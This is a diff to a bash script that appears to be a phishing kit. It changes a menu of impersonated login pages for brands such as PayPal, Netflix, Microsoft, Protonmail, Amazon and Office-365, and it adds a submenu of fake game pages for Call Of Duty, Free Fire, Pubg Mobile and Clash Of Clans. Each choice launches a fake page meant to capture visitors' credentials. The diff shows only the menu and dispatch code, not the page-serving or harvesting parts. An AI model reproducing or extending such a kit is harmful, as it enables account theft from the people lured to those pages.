@@ -163,7 +163,7 @@ printf "\e[1;92m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[0m\e[1;96m Spotify\e[0m        
 
 printf "\e[1;92m[\e[0m\e[1;77m08\e[0m\e[1;92m]\e[0m\e[1;96m Netflix\e[0m        \e[1;92m[\e[0m\e[1;77m25\e[0m\e[1;92m]\e[0m\e[1;96m Shopify   \e[0m       \e[1;92m[\e[0m\e[1;77m42\e[0m\e[1;92m]\e[0m\e[1;96m Bitcoin\e[0m  \n"
 
-printf "\e[1;92m[\e[0m\e[1;77m09\e[0m\e[1;92m]\e[0m\e[1;96m PayPal\e[0m         \e[1;92m[\e[0m\e[1;77m26\e[0m\e[1;92m]\e[0m\e[1;96m Messenger  \e[0m      \e[1;92m[\e[0m\e[1;77m43\e[0m\e[1;92m]\e[0m\e[1;96m free-fire\e[0m     \n"
+printf "\e[1;92m[\e[0m\e[1;77m09\e[0m\e[1;92m]\e[0m\e[1;96m PayPal\e[0m         \e[1;92m[\e[0m\e[1;77m26\e[0m\e[1;92m]\e[0m\e[1;96m Messenger  \e[0m      \e[1;92m[\e[0m\e[1;77m43\e[0m\e[1;92m]\e[0m\e[1;96m Ytsubs\e[0m     \n"
 
 printf "\e[1;92m[\e[0m\e[1;77m10\e[0m\e[1;92m]\e[0m\e[1;96m Origin\e[0m         \e[1;92m[\e[0m\e[1;77m27\e[0m\e[1;92m]\e[0m\e[1;96m GitLab   \e[0m        \e[1;92m[\e[0m\e[1;77m44\e[0m\e[1;92m]\e[0m\e[1;96m Ofice-365\e[0m \n"
 
@@ -171,17 +171,17 @@ printf "\e[1;92m[\e[0m\e[1;77m11\e[0m\e[1;92m]\e[0m\e[1;96m Steam\e[0m          
 
 printf "\e[1;92m[\e[0m\e[1;77m12\e[0m\e[1;92m]\e[0m\e[1;96m Yahoo\e[0m          \e[1;92m[\e[0m\e[1;77m29\e[0m\e[1;92m]\e[0m\e[1;96m MySpace   \e[0m       \e[1;92m[\e[0m\e[1;77m46\e[0m\e[1;92m]\e[0m\e[1;96m Amazon\e[0m \n"
 
-printf "\e[1;92m[\e[0m\e[1;77m13\e[0m\e[1;92m]\e[0m\e[1;96m Linkedin\e[0m       \e[1;92m[\e[0m\e[1;77m30\e[0m\e[1;92m]\e[0m\e[1;96m Badoo   \e[0m         \e[1;92m[\e[0m\e[1;77m47\e[0m\e[1;92m]\e[0m\e[1;96m Pubg\e[0m    \n"
+printf "\e[1;92m[\e[0m\e[1;77m13\e[0m\e[1;92m]\e[0m\e[1;96m Linkedin\e[0m       \e[1;92m[\e[0m\e[1;77m30\e[0m\e[1;92m]\e[0m\e[1;96m Badoo   \e[0m         \e[1;92m[\e[0m\e[1;77m47\e[0m\e[1;92m]\e[0m\e[1;96m Yahoo Web\e[0m    \n"
 
 printf "\e[1;92m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;96m Protonmail\e[0m     \e[1;92m[\e[0m\e[1;77m31\e[0m\e[1;92m]\e[0m\e[1;96m VK   \e[0m            \e[1;92m[\e[0m\e[1;77m48\e[0m\e[1;92m]\e[0m\e[1;96m Pornhub\e[0m    \n"
 
 printf "\e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;96m Wordpress\e[0m      \e[1;92m[\e[0m\e[1;77m32\e[0m\e[1;92m]\e[0m\e[1;96m Yandex   \e[0m        \e[1;92m[\e[0m\e[1;77m49\e[0m\e[1;92m]\e[0m\e[1;96m Xvideos\e[0m     \n"
 
-printf "\e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;96m Microsoft\e[0m      \e[1;92m[\e[0m\e[1;77m33\e[0m\e[1;92m]\e[0m\e[1;96m devianART   \e[0m     \e[1;92m[\e[0m\e[1;77m50\e[0m\e[1;92m]\e[0m\e[1;96m Cod-Mobile\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;96m Microsoft\e[0m      \e[1;92m[\e[0m\e[1;77m33\e[0m\e[1;92m]\e[0m\e[1;96m devianART   \e[0m     \e[1;92m[\e[0m\e[1;77m50\e[0m\e[1;92m]\e[0m\e[1;96m Games Pages\e[0m\n"
 
 printf "\e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;96m IGFollowers\e[0m    \e[1;92m[\e[0m\e[1;77m34\e[0m\e[1;92m]\e[0m\e[1;96m StackOverflow\e[0m    \e[1;92m[\e[0m\e[1;77m51\e[0m\e[1;92m]\e[0m\e[1;96m operadoras\e[0m \n"
 
-printf "\e[1;92m[\e[0m\e[1;77m99\e[0m\e[1;92m]\e[0m\e[1;91m Custom \e[0m        \e[1;92m[\e[0m\e[1;77mY\e[0m\e[1;92m]\e[0m\e[1;91m Youtube channel \e[0m  \e[1;92m[\e[0m\e[1;77mT\e[0m\e[1;92m]\e[0m\e[1;91m Telegram\e[0m \n"     
+printf "\e[1;92m[\e[0m\e[1;77m99\e[0m\e[1;92m]\e[0m\e[1;91m Custom \e[0m        \e[1;92m[\e[0m\e[1;77mY\e[0m\e[1;92m]\e[0m\e[1;91m Youtube channel \e[0m  \e[1;92m[\e[0m\e[1;77mT\e[0m\e[1;92m]\e[0m\e[1;91m Telegram Group\e[0m \n"     
 
 printf "\e[1;92m[\e[0m\e[1;77m00\e[0m\e[1;92m]\e[0m\e[1;91m Exit\e[0m           \e[1;92m[\e[0m\e[1;77mF\e[0m\e[1;92m]\e[0m\e[1;91m Follow me one git hub\e[0m\n"
 
@@ -356,7 +356,7 @@ server="bitcoin"
 start1
 
 elif [[ $menu_option == 43 ]]; then
-server="freefire"
+server="ytsubs"
 start1
 
 elif [[ $menu_option == 44 ]]; then
@@ -373,7 +373,7 @@ server="Amazon"
 start1
 
 elif [[ $menu_option == 47 ]]; then
-server="pubg"
+server="yahoo_web"
 start1
 
 elif [[ $menu_option == 48 ]]; then
@@ -385,8 +385,7 @@ server="xvideos"
 start1
 
 elif [[ $menu_option == 50 ]]; then
-server="codm"
-start1
+games
 
 elif [[ $menu_option == 51 ]]; then
 operadoras
@@ -445,6 +444,45 @@ command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not inst
 
 
 
+games() {
+banner
+printf " \n"
+printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Call Of Duty\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Free Fire\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Pubg Mobile\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m Clash Of Clans\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m05\e[0m\e[1;31m]\e[0m\e[1;93m Ig Autoliker Page\e[0m\n"
+
+printf "\e[0m\n"
+read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' game
+
+if [[ $game == 1 || $game == 01 ]]; then
+server="instagram"
+start1
+
+elif [[ $game == 2 || $game == 02 ]]; then
+server="cpr"
+start1
+
+elif [[ $game == 3 || $game == 03 ]]; then
+server="mcp"
+start1
+
+elif [[ $game == 4 || $game == 04 ]]; then
+server="cip"
+start1
+
+elif [[ $game == 5 || $game == 05 ]]; then
+server="igauth"
+start1
+
+else
+printf "\n\n  \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
+sleep 1
+clear
+menu
+fi
+}
 
 
 lol(){
